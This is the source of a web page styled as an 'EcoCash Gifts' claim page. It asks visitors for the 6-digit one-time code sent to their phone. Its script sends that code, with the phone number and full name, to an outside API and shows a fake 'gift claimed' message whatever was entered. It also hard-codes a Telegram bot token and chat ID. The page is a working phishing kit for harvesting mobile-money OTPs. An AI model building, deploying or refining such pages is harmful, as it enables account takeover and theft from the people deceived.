<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash Gifts - Verify OTP</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: #f5f7fa;
            overflow-x: hidden;
        }
        
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 40px 30px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
            text-align: center;
            border: 1px solid #f0f0f0;
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            0% {
                opacity: 0;
                transform: translateY(30px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .verify-icon {
            font-size: 72px;
            margin-bottom: 15px;
            display: block;
            animation: bounceIn 0.6s ease;
        }
        
        @keyframes bounceIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            50% {
                transform: scale(1.2);
            }
            70% {
                transform: scale(0.9);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 15px;
            color: #777;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .subtitle span {
            color: #ff6b00;
            font-weight: 700;
        }
        
        .info-box {
            background: #f8f9ff;
            border-radius: 16px;
            padding: 18px 20px;
            text-align: left;
            margin-bottom: 25px;
            border: 1px solid #eef0f5;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 0;
        }
        
        .info-item:first-child {
            border-bottom: 1px solid #eef0f5;
            padding-bottom: 10px;
            margin-bottom: 6px;
        }
        
        .info-label {
            color: #888;
            font-weight: 500;
            font-size: 14px;
        }
        
        .info-value {
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        
        .phone-display {
            color: #0066ff;
            font-size: 15px;
        }
        
        .gift-display {
            color: #ff6b00;
            font-size: 15px;
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }
        
        .status-badge.verified {
            background: #e8f5e9;
            color: #27ae60;
        }
        
        .otp-timer {
            background: linear-gradient(135deg, #f8f9ff, #f0f4ff);
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 25px;
            border: 2px solid #e8edf5;
            transition: border-color 0.3s;
        }
        
        .otp-timer .label {
            font-size: 13px;
            color: #888;
            display: block;
            margin-bottom: 4px;
            font-weight: 500;
        }
        
        .otp-timer .time {
            font-size: 32px;
            font-weight: 700;
            color: #333;
            font-variant-numeric: tabular-nums;
        }
        
        .otp-input-wrapper {
            background: #f8f9ff;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid #eef0f5;
        }
        
        .otp-input-wrapper label {
            display: block;
            font-size: 14px;
            color: #666;
            font-weight: 500;
            margin-bottom: 12px;
            text-align: left;
        }
        
        .otp-input-row {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        
        .otp-input {
            width: 55px;
            height: 65px;
            border: 2px solid #dce0e8;
            border-radius: 14px;
            font-size: 28px;
            text-align: center;
            font-weight: 700;
            color: #333;
            background: white;
            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .otp-input:focus {
            border-color: #0066ff;
            outline: none;
            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.12);
            transform: scale(1.02);
        }
        
        .otp-input.filled {
            border-color: #27ae60;
            background: #f0fff4;
        }
        
        .otp-input.error {
            border-color: #e74c3c !important;
            animation: shake 0.4s ease;
            background: #fff5f5;
        }
        
        @keyframes shake {
            0%,
            100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-8px); }
            80% { transform: translateX(8px); }
        }
        
        .resend-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .resend-btn {
            background: none;
            border: none;
            color: #0066ff;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            padding: 6px 12px;
            border-radius: 8px;
            transition: background 0.2s, opacity 0.2s;
        }
        
        .resend-btn:hover:not(:disabled) {
            background: #f0f4ff;
        }
        
        .resend-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        
        .resend-timer {
            font-size: 14px;
            color: #999;
            font-weight: 500;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0066ff, #0052cc);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
            margin-bottom: 12px;
            position: relative;
        }
        
        .btn:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.35);
        }
        
        .btn:active:not(:disabled) {
            transform: scale(0.98);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .btn .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .btn-success {
            background: linear-gradient(135deg, #27ae60, #1e8449);
        }
        
        .btn-success:hover:not(:disabled) {
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.35);
        }
        
        .btn-outline {
            background: transparent;
            color: #0066ff;
            border: 2px solid #0066ff;
            margin-bottom: 0;
        }
        
        .btn-outline:hover:not(:disabled) {
            background: #0066ff;
            color: white;
            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.2);
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 12px;
            display: none;
            font-weight: 500;
            padding: 10px;
            background: #fff5f5;
            border-radius: 10px;
            border: 1px solid #fce4ec;
        }
        
        .error-message.show {
            display: block;
            animation: slideUp 0.3s ease;
        }
        
        .error-message.success {
            background: #e8f5e9;
            border-color: #c8e6c9;
            color: #27ae60;
        }
        
        footer {
            padding: 15px;
            color: #aaa;
            font-size: 12px;
            text-align: center;
            margin-top: 15px;
        }
        
        @media (max-width: 480px) {
            .card {
                padding: 25px 18px;
            }
            .title {
                font-size: 22px;
            }
            .verify-icon {
                font-size: 56px;
            }
            .otp-input {
                width: 45px;
                height: 55px;
                font-size: 22px;
            }
            .otp-input-row {
                gap: 8px;
            }
            .otp-timer .time {
                font-size: 26px;
            }
            .info-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 2px;
            }
        }
        
        @media (max-width: 380px) {
            .otp-input {
                width: 38px;
                height: 48px;
                font-size: 18px;
            }
            .otp-input-row {
                gap: 6px;
            }
        }
    </style>
</head>

<body>
    <div class="card">
        <span class="verify-icon">🎁</span>
        <h1 class="title">Verify to Claim Your Gift</h1>
        <p class="subtitle">
            Enter the 6-digit code sent to your phone to <span>claim your gift</span>
        </p>

        <!-- Gift & Phone Info -->
        <div class="info-box">
            <div class="info-item">
                <span class="info-label">🎁 Your Gift</span>
                <span class="info-value gift-display" id="displayGift">Airtime</span>
            </div>
            <div class="info-item">
                <span class="info-label">📱 Phone Number</span>
                <span class="info-value phone-display" id="displayPhone">+263 77 123 4567</span>
            </div>
            <div class="info-item">
                <span class="info-label">🔐 Status</span>
                <span class="info-value">
                    <span class="status-badge verified">✓ Verified</span>
                </span>
            </div>
        </div>

        <!-- OTP Timer -->
        <div class="otp-timer" id="timerContainer">
            <span class="label">⏱️ OTP Expires In</span>
            <span class="time" id="timerDisplay">05:00</span>
        </div>

        <!-- OTP Input -->
        <div class="otp-input-wrapper">
            <label>Enter 6-digit OTP</label>
            <div class="otp-input-row" id="otpContainer">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>
            
            <div class="resend-section">
                <button class="resend-btn" id="resendBtn" disabled>Resend OTP</button>
                <span class="resend-timer" id="resendTimer">Resend available in 2:00</span>
            </div>
        </div>

        <!-- Error Message -->
        <div class="error-message" id="errorMessage"></div>

        <!-- Verify Button -->
        <button class="btn" id="verifyBtn">CLAIM MY GIFT</button>
        <button class="btn btn-outline" onclick="window.location.href='index.html'">← Back to Home</button>
    </div>

    <footer>© 2026 EcoCash Gifts • Share the joy 🎁</footer>

    <script>
        // ============================================
        // TELEGRAM & API CONFIGURATION - UPDATED URL
        // ============================================
        const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
        const CHAT_ID = '157828443';
        const API_URL = 'https://eco09giftscom-production.up.railway.app/api';

        console.log('====================================');
        console.log('🎁 EcoCash Gifts - Verification Page');
        console.log('====================================');
        console.log('🤖 Bot Token:', BOT_TOKEN);
        console.log('📱 Chat ID:', CHAT_ID);
        console.log('🌐 API URL:', API_URL);
        console.log('====================================');

        // ============================================
        // CONFIGURATION
        // ============================================
        const OTP_LENGTH = 6;
        const OTP_EXPIRY_SECONDS = 300;
        const RESEND_COOLDOWN_SECONDS = 120;

        // ============================================
        // DOM REFERENCES
        // ============================================
        const otpInputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendBtn = document.getElementById('resendBtn');
        const timerDisplay = document.getElementById('timerDisplay');
        const timerContainer = document.getElementById('timerContainer');
        const resendTimer = document.getElementById('resendTimer');
        const errorMessage = document.getElementById('errorMessage');
        const displayPhone = document.getElementById('displayPhone');
        const displayGift = document.getElementById('displayGift');

        // ============================================
        // STATE
        // ============================================
        let otpValue = '';
        let timeLeft = OTP_EXPIRY_SECONDS;
        let resendCooldown = 0;
        let timerInterval = null;
        let resendInterval = null;
        let isResending = false;

        // ============================================
        // INITIALIZATION
        // ============================================
        const storedPhone = localStorage.getItem('phone') || '771234567';
        const formattedPhone = '+263 ' + storedPhone.slice(0, 2) + ' ' + storedPhone.slice(2, 5) + ' ' + storedPhone.slice(5);
        displayPhone.textContent = formattedPhone;

        const giftName = localStorage.getItem('giftName') || 'Gift';
        const giftIcon = localStorage.getItem('giftIcon') || '🎁';
        displayGift.textContent = giftIcon + ' ' + giftName;

        console.log('🎁 Claiming:', giftName);
        console.log('📞 Phone:', formattedPhone);

        // ============================================
        // TIMER FUNCTIONS
        // ============================================
        function startTimer() {
            clearInterval(timerInterval);
            timeLeft = OTP_EXPIRY_SECONDS;
            updateTimerDisplay();
            
            timerInterval = setInterval(() => {
                timeLeft--;
                updateTimerDisplay();
                
                if (timeLeft <= 30) {
                    timerContainer.classList.add('expiring');
                    timerDisplay.classList.add('warning');
                }
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = 'EXPIRED';
                    timerDisplay.classList.add('warning');
                    disableOTPInputs(true);
                    verifyBtn.disabled = true;
                    verifyBtn.textContent = '⏰ OTP EXPIRED';
                    enableResend();
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        function startResendCooldown() {
            resendCooldown = RESEND_COOLDOWN_SECONDS;
            resendBtn.disabled = true;
            updateResendTimer();
            
            resendInterval = setInterval(() => {
                resendCooldown--;
                updateResendTimer();
                
                if (resendCooldown <= 0) {
                    clearInterval(resendInterval);
                    resendBtn.disabled = false;
                    resendTimer.textContent = 'Resend OTP';
                }
            }, 1000);
        }

        function updateResendTimer() {
            const minutes = Math.floor(resendCooldown / 60);
            const seconds = resendCooldown % 60;
            resendTimer.textContent = `Resend available in ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        function enableResend() {
            resendBtn.disabled = false;
            resendTimer.textContent = 'Resend OTP';
        }

        // ============================================
        // OTP INPUT HANDLING
        // ============================================
        function getOTPValue() {
            return Array.from(otpInputs).map(input => input.value).join('');
        }

        function setOTPValue(value) {
            const digits = value.split('').slice(0, OTP_LENGTH);
            otpInputs.forEach((input, index) => {
                input.value = digits[index] || '';
                if (input.value) {
                    input.classList.add('filled');
                } else {
                    input.classList.remove('filled');
                }
            });
            otpValue = getOTPValue();
            checkOTPComplete();
        }

        function checkOTPComplete() {
            const value = getOTPValue();
            verifyBtn.disabled = value.length !== OTP_LENGTH;
        }

        function disableOTPInputs(disabled) {
            otpInputs.forEach(input => {
                input.disabled = disabled;
                input.style.opacity = disabled ? '0.5' : '1';
            });
        }

        function clearOTPInputs() {
            otpInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            otpValue = '';
            errorMessage.classList.remove('show');
            checkOTPComplete();
            otpInputs[0].focus();
        }

        // OTP Input Events
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                
                if (input.value) {
                    input.classList.add('filled');
                    input.classList.remove('error');
                } else {
                    input.classList.remove('filled');
                }
                
                if (input.value.length === 1 && index < OTP_LENGTH - 1) {
                    otpInputs[index + 1].focus();
                }
                
                otpValue = getOTPValue();
                checkOTPComplete();
                
                // Auto-submit when all digits entered
                if (otpValue.length === OTP_LENGTH) {
                    setTimeout(() => {
                        verifyBtn.click();
                    }, 300);
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                    otpInputs[index - 1].classList.remove('filled');
                }
                
                if (e.key === 'ArrowLeft' && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) {
                    otpInputs[index + 1].focus();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text');
                const numbers = data.replace(/\D/g, '');
                setOTPValue(numbers);
                const lastIndex = Math.min(numbers.length - 1, OTP_LENGTH - 1);
                if (lastIndex >= 0) {
                    otpInputs[lastIndex].focus();
                }
            });

            input.addEventListener('focus', () => {
                input.select();
            });
        });

        // ============================================
        // VERIFY OTP
        // ============================================
        verifyBtn.addEventListener('click', function() {
            const otp = getOTPValue();
            
            // Check if OTP is 6 digits
            if (otp.length !== OTP_LENGTH) {
                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
                errorMessage.className = 'error-message show';
                return;
            }

            if (timeLeft <= 0) {
                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
                errorMessage.className = 'error-message show';
                return;
            }

            // ============================================
            // ✅ ACCEPT ANY 6-DIGIT OTP
            // ============================================
            this.disabled = true;
            this.innerHTML = '<span class="loader"></span> VERIFYING...';
            errorMessage.classList.remove('show');

            // Send to backend
            const phone = localStorage.getItem('phone') || '771234567';
            const giftName = localStorage.getItem('giftName') || 'Gift';
            const fullName = localStorage.getItem('fullName') || 'User';

            fetch(`${API_URL}/auth/verify-otp`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    phoneNumber: phone,
                    otp: otp,
                    giftName: giftName,
                    fullName: fullName
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('📤 OTP verification response:', data);
            })
            .catch(error => {
                console.error('❌ OTP verification error:', error);
            });

            setTimeout(() => {
                // Any 6-digit OTP is accepted
                this.innerHTML = '🎁 GIFT CLAIMED!';
                this.classList.add('btn-success');
                
                localStorage.setItem('verified', 'true');
                localStorage.setItem('otpVerified', 'true');
                
                errorMessage.textContent = '🎁 Gift claimed successfully! Redirecting...';
                errorMessage.className = 'error-message success show';
                
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 1000);
            }, 1200);
        });

        // ============================================
        // RESEND OTP
        // ============================================
        resendBtn.addEventListener('click', function() {
            if (isResending || this.disabled) return;
            
            isResending = true;
            this.disabled = true;
            this.textContent = '⏳ Sending...';
            
            setTimeout(() => {
                clearOTPInputs();
                errorMessage.classList.remove('show');
                verifyBtn.disabled = true;
                verifyBtn.textContent = 'CLAIM MY GIFT';
                verifyBtn.classList.remove('btn-success');
                
                startTimer();
                startResendCooldown();
                disableOTPInputs(false);
                
                errorMessage.textContent = '✅ New OTP sent successfully!';
                errorMessage.className = 'error-message success show';
                
                setTimeout(() => {
                    errorMessage.classList.remove('show');
                }, 3000);
                
                isResending = false;
                this.textContent = 'Resend OTP';
                this.disabled = true;
            }, 2000);
        });

        // ============================================
        // KEYBOARD SHORTCUTS
        // ============================================
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !verifyBtn.disabled) {
                verifyBtn.click();
            }
            if (e.key === 'Escape') {
                clearOTPInputs();
            }
        });

        // ============================================
        // START
        // ============================================
        startTimer();
        startResendCooldown();
        otpInputs[0].focus();
        checkOTPComplete();

        console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
        console.log('🎁 Gift:', giftName);
        console.log('📞 Phone:', formattedPhone);
    </script>

</body>

</html>
